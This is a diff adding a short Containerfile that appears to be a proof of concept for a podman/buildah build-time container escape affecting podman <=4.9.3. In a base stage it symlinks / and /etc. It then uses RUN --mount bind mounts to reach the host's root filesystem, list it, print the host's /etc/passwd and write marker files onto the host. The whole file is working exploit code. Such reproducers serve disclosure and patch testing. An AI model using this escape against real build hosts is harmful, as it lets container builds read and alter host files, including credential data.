@@ -1,0 +1,19 @@
+# cat ~/cve_Containerfile
+# podman <=4.9.3
+# builda <=1.23
+# podman build -f ~/cve_Containerfile .
+FROM alpine as base
+
+RUN ln -s / /rootdir
+RUN ln -s /etc /etc2
+
+FROM alpine
+
+RUN echo "ls container root"
+RUN ls -l /
+
+RUN echo "With exploit show host root, not the container's root, and create /BIND_BREAKOUT in / on the host"
+RUN --mount=type=bind,from=base,source=/rootdir,destination=/exploit,rw ls -l /exploit; touch /exploit/BIND_BREAKOUT; ls -l /exploit
+
+RUN echo "With exploit show host /etc/passwd, not the container's, and create /BIND_BREAKOUT2 in /etc on the host"
+RUN --mount=type=bind,rw,source=/etc2,destination=/etc2,from=base ls -l /; ls -l /etc2/passwd; cat /etc2/passwd; touch /etc2/BIND_BREAKOUT2; ls -l /etc2 
